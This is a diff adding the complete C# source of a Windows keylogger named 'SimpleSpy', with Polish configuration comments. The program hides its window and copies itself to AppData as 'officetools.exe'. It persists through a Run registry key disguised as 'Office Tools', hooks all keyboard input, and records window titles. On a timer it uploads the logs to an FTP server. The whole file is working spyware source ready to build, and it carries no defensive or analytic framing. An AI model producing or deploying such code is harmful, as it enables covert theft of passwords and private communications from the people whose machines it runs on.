@@ -1,0 +1,502 @@
+using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Net;
+using System.Net.Mail;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Timers;
+using System.Windows.Forms;
+
+namespace SimpleSpy
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("user32.dll")]
+        static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);
+        [DllImport("user32.dll")]
+        static extern bool UnhookWindowsHookEx(IntPtr hInstance);
+        [DllImport("user32.dll")]
+        static extern int CallNextHookEx(IntPtr idHook, int nCode, int wParam, ref keyboardHookStruct lParam);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr LoadLibrary(string lpFileName);
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
+        public delegate int keyboardHookProc(int code, int wParam, ref keyboardHookStruct lParam);
+
+        private keyboardHookProc hookProcDelegate;
+
+        public struct keyboardHookStruct
+        {
+            public int vkCode;
+            public int scanCode;
+            public int flags;
+            public int time;
+            public int dwExtraInfo;
+        }
+        const int WH_KEYBOARD_LL = 13;
+        const int WM_KEYDOWN = 0x100;
+        const int WM_KEYUP = 0x101;
+        const int WM_SYSKEYDOWN = 0x104;
+        const int WM_SYSKEYUP = 0x105;
+        static IntPtr hhook = IntPtr.Zero;
+        static IntPtr hCurrentWindow = IntPtr.Zero;
+        static string Log = String.Empty;
+        static string windowTitle = String.Empty;
+        static byte shift = 0;
+
+        //KONFIGURACJA
+        static int ti = 1; //co ile minut wysyłać log
+        static string FTPServer = "adres FTP/";
+        static string FTPUserName = "Login";
+        static string FTPPassword = "Hasło";
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            this.Hide();
+        }
+
+        private bool IsStartupItem()
+        {
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (rkApp.GetValue("Office Tools") == null)
+                // The value doesn't exist, the application is not set to run at startup
+                return false;
+            else
+                // The value exists, the application is set to run at startup
+                return true;
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            string tempPath = Path.GetTempPath();
+
+            // The path to the key where Windows looks for startup applications
+            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            if (!IsStartupItem())
+            {
+                string destFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "officetools.exe");
+
+                File.Copy(Application.ExecutablePath.ToString(), destFilePath);
+
+                // Add the value in the registry so that the application runs at startup
+                rkApp.SetValue("Office Tools", destFilePath);
+            }
+
+            hookProcDelegate = hookProc;
+            IntPtr hInstance = LoadLibrary("User32");
+            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, hookProcDelegate, hInstance, 0);
+            System.Timers.Timer myTimer = new System.Timers.Timer();
+            myTimer.Elapsed += new ElapsedEventHandler(OnTimedEvent);
+            myTimer.Interval = ti * 60 * 1000;
+            myTimer.Enabled = true;
+        }
+
+        private static string Colorize(string inputstr, int keytype)
+        {
+            switch (keytype)
+            {
+                case 1: return ("<i>" + inputstr + "</i>"); //function keys
+                case 2: return ("<span style=\"color: #808080;\">" + inputstr + "</span>"); //numbers
+                case 3: return ("<span style=\"color: #000080;\">" + inputstr + "</span>"); //punctuation
+                case 4: return ("<span style=\"color: #008000;\">" + inputstr + "</span>"); //letters
+                default: return inputstr;
+            }
+
+        }
+        private static void OnTimedEvent(object source, ElapsedEventArgs e)
+        {
+            if (Log.Length < 8)
+                return;
+
+            string logFinal = String.Empty;
+            logFinal = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head><body>";
+            logFinal += Log;
+            logFinal += "</body></html>";
+
+            string tempPath = Path.GetTempPath();
+
+            string logFileName = Environment.MachineName + "-" + Environment.UserName + "-" + DateTime.Now.ToString("HH-mm-ss_d-M-yyyy") + ".html";
+
+            string fullPath = tempPath + logFileName;
+
+            using (StreamWriter outfile = new StreamWriter(fullPath))
+            {
+                outfile.Write(logFinal);
+            }
+
+            try
+            {
+                //WYSYŁANIE NA FTP
+                FtpWebRequest ftp = (FtpWebRequest)WebRequest.Create(FTPServer + "/" + logFileName);
+                ftp.Credentials = new NetworkCredential(FTPUserName, FTPPassword);
+                ftp.KeepAlive = true;
+                ftp.UseBinary = true;
+                ftp.UsePassive = true;
+                ftp.Method = WebRequestMethods.Ftp.UploadFile;
+                FileStream fs = File.OpenRead(fullPath); //ścieżka lokalna
+                byte[] buffer = new byte[fs.Length];
+                fs.Read(buffer, 0, buffer.Length);
+                fs.Close();
+                Stream ftpstream = ftp.GetRequestStream();
+                ftpstream.Write(buffer, 0, buffer.Length);
+                ftpstream.Close();
+            }
+            catch(Exception)
+            {
+
+            }
+
+            //WYSYŁANIE NA FTP KONIEC
+
+            File.Delete(fullPath);
+
+            Log = String.Empty;
+            logFinal = String.Empty;
+        }
+        public static int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
+        {
+            if (code >= 0)
+            {
+                Keys key = (Keys)lParam.vkCode;
+                KeyEventArgs kea = new KeyEventArgs(key);
+                if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+                {
+                    if (hCurrentWindow != GetForegroundWindow())
+                    {
+                        StringBuilder sb = new StringBuilder(256);
+                        hCurrentWindow = GetForegroundWindow();
+                        GetWindowText(hCurrentWindow, sb, sb.Capacity);
+                        Log += "<br /><strong>[" + sb.ToString() + "]</strong><br />";
+                    }
+                    if (Keys.Shift == Control.ModifierKeys) shift = 1;
+                    else shift = 0;
+                    switch (kea.KeyCode)
+                    {
+                        case Keys.Back: Log += Colorize("[Backspace]", 1);
+                            break;
+                        case Keys.Tab: Log += Colorize("[Tab]", 1);
+                            break;
+                        case Keys.LineFeed: Log += Colorize("[LineFeed]", 1);
+                            break;
+                        case Keys.Clear: Log += Colorize("[Clear]", 1);
+                            break;
+                        case Keys.Return: Log += Colorize("[Enter]<br />", 1);
+                            break;
+                        case Keys.RMenu: Log += Colorize("[RAlt]", 1);
+                            break;
+                        case Keys.LMenu: Log += Colorize("[LAlt]", 1);
+                            break;
+                        case Keys.CapsLock: Log += Colorize("[CapsLock]", 1);
+                            break;
+                        case Keys.Escape: Log += Colorize("[Escape]", 1);
+                            break;
+                        case Keys.Space: Log += "&nbsp;";
+                            break;
+                        case Keys.Delete: Log += Colorize("[Delete]", 1);
+                            break;
+                        case Keys.D0:
+                            if (shift == 0)
+                                Log += Colorize("0", 2);
+                            else
+                                Log += Colorize(")", 3);
+                            break;
+                        case Keys.D1:
+                            if (shift == 0)
+                                Log += Colorize("1", 2);
+                            else
+                                Log += Colorize("!", 3);
+                            break;
+                        case Keys.D2:
+                            if (shift == 0)
+                                Log += Colorize("2", 2);
+                            else
+                                Log += Colorize("@", 3);
+                            break;
+                        case Keys.D3:
+                            if (shift == 0)
+                                Log += Colorize("3", 2);
+                            else
+                                Log += Colorize("#", 3);
+                            break;
+                        case Keys.D4:
+                            if (shift == 0)
+                                Log += Colorize("4", 2);
+                            else
+                                Log += Colorize("$", 3);
+                            break;
+                        case Keys.D5:
+                            if (shift == 0)
+                                Log += Colorize("5", 2);
+                            else
+                                Log += Colorize("%", 3);
+                            break;
+                        case Keys.D6:
+                            if (shift == 0)
+                                Log += Colorize("6", 2);
+                            else
+                                Log += Colorize("^", 3);
+                            break;
+                        case Keys.D7:
+                            if (shift == 0)
+                                Log += Colorize("7", 2);
+                            else
+                                Log += Colorize("&amp;", 3);
+                            break;
+                        case Keys.D8:
+                            if (shift == 0)
+                                Log += Colorize("8", 2);
+                            else
+                                Log += Colorize("*", 3);
+                            break;
+                        case Keys.D9:
+                            if (shift == 0)
+                                Log += Colorize("9", 2);
+                            else
+                                Log += Colorize("(", 3);
+                            break;
+                        case Keys.A:
+                            if (shift == 0)
+                                Log += Colorize("a", 4);
+                            else
+                                Log += Colorize("A", 4);
+                            break;
+                        case Keys.B:
+                            if (shift == 0)
+                                Log += Colorize("b", 4);
+                            else
+                                Log += Colorize("B", 4);
+                            break;
+                        case Keys.C:
+                            if (shift == 0)
+                                Log += Colorize("c", 4);
+                            else
+                                Log += Colorize("C", 4);
+                            break;
+                        case Keys.D:
+                            if (shift == 0)
+                                Log += Colorize("d", 4);
+                            else
+                                Log += Colorize("D", 4);
+                            break;
+                        case Keys.E:
+                            if (shift == 0)
+                                Log += Colorize("e", 4);
+                            else
+                                Log += Colorize("E", 4);
+                            break;
+                        case Keys.F:
+                            if (shift == 0)
+                                Log += Colorize("f", 4);
+                            else
+                                Log += Colorize("F", 4);
+                            break;
+                        case Keys.G:
+                            if (shift == 0)
+                                Log += Colorize("g", 4);
+                            else
+                                Log += Colorize("G", 4);
+                            break;
+                        case Keys.H:
+                            if (shift == 0)
+                                Log += Colorize("h", 4);
+                            else
+                                Log += Colorize("H", 4);
+                            break;
+                        case Keys.I:
+                            if (shift == 0)
+                                Log += Colorize("i", 4);
+                            else
+                                Log += Colorize("I", 4);
+                            break;
+                        case Keys.J:
+                            if (shift == 0)
+                                Log += Colorize("j", 4);
+                            else
+                                Log += Colorize("J", 4);
+                            break;
+                        case Keys.K:
+                            if (shift == 0)
+                                Log += Colorize("k", 4);
+                            else
+                                Log += Colorize("K", 4);
+                            break;
+                        case Keys.L:
+                            if (shift == 0)
+                                Log += Colorize("l", 4);
+                            else
+                                Log += Colorize("L", 4);
+                            break;
+                        case Keys.M:
+                            if (shift == 0)
+                                Log += Colorize("m", 4);
+                            else
+                                Log += Colorize("M", 4);
+                            break;
+                        case Keys.N:
+                            if (shift == 0)
+                                Log += Colorize("n", 4);
+                            else
+                                Log += Colorize("N", 4);
+                            break;
+                        case Keys.O:
+                            if (shift == 0)
+                                Log += Colorize("o", 4);
+                            else
+                                Log += Colorize("O", 4);
+                            break;
+                        case Keys.P:
+                            if (shift == 0)
+                                Log += Colorize("p", 4);
+                            else
+                                Log += Colorize("P", 4);
+                            break;
+                        case Keys.Q:
+                            if (shift == 0)
+                                Log += Colorize("q", 4);
+                            else
+                                Log += Colorize("Q", 4);
+                            break;
+                        case Keys.R:
+                            if (shift == 0)
+                                Log += Colorize("r", 4);
+                            else
+                                Log += Colorize("R", 4);
+                            break;
+                        case Keys.S:
+                            if (shift == 0)
+                                Log += Colorize("s", 4);
+                            else
+                                Log += Colorize("S", 4);
+                            break;
+                        case Keys.T:
+                            if (shift == 0)
+                                Log += Colorize("t", 4);
+                            else
+                                Log += Colorize("T", 4);
+                            break;
+                        case Keys.U:
+                            if (shift == 0)
+                                Log += Colorize("u", 4);
+                            else
+                                Log += Colorize("U", 4);
+                            break;
+                        case Keys.V:
+                            if (shift == 0)
+                                Log += Colorize("v", 4);
+                            else
+                                Log += Colorize("V", 4);
+                            break;
+                        case Keys.W:
+                            if (shift == 0)
+                                Log += Colorize("w", 4);
+                            else
+                                Log += Colorize("W", 4);
+                            break;
+                        case Keys.X:
+                            if (shift == 0)
+                                Log += Colorize("x", 4);
+                            else
+                                Log += Colorize("X", 4);
+                            break;
+                        case Keys.Y:
+                            if (shift == 0)
+                                Log += Colorize("y", 4);
+                            else
+                                Log += Colorize("Y", 4);
+                            break;
+                        case Keys.Z:
+                            if (shift == 0)
+                                Log += Colorize("z", 4);
+                            else
+                                Log += Colorize("Z", 4);
+                            break;
+                        case Keys.Oemtilde:
+                            if (shift == 0)
+                                Log += Colorize("`", 3);
+                            else
+                                Log += Colorize("~", 3);
+                            break;
+                        case Keys.OemMinus:
+                            if (shift == 0)
+                                Log += Colorize("-", 3);
+                            else
+                                Log += Colorize("_", 3);
+                            break;
+                        case (Keys)187:
+                            if (shift == 0)
+                                Log += Colorize("=", 3);
+                            else
+                                Log += Colorize("+", 3);
+                            break;
+                        case Keys.OemOpenBrackets:
+                            if (shift == 0)
+                                Log += Colorize("[", 3);
+                            else
+                                Log += Colorize("{", 3);
+                            break;
+                        case Keys.Oem6:
+                            if (shift == 0)
+                                Log += Colorize("]", 3);
+                            else
+                                Log += Colorize("}", 3);
+                            break;
+                        case Keys.Oem5:
+                            if (shift == 0)
+                                Log += Colorize("\\", 3);
+                            else
+                                Log += Colorize("|", 3);
+                            break;
+                        case Keys.Oem1:
+                            if (shift == 0)
+                                Log += Colorize(";", 3);
+                            else
+                                Log += Colorize(":", 3);
+                            break;
+                        case Keys.Oem7:
+                            if (shift == 0)
+                                Log += Colorize("'", 3);
+                            else
+                                Log += Colorize("\"", 3);
+                            break;
+                        case Keys.Oemcomma:
+                            if (shift == 0)
+                                Log += Colorize(",", 3);
+                            else
+                                Log += Colorize("&lt;", 3);
+                            break;
+                        case Keys.OemPeriod:
+                            if (shift == 0)
+                                Log += Colorize(".", 3);
+                            else
+                                Log += Colorize("&gt;", 3);
+                            break;
+                        case Keys.OemQuestion:
+                            if (shift == 0)
+                                Log += Colorize("/", 3);
+                            else
+                                Log += Colorize("?", 3);
+                            break;
+                    }
+                }
+            }
+            return CallNextHookEx(hhook, code, wParam, ref lParam);
+        }
+
+    }
+}
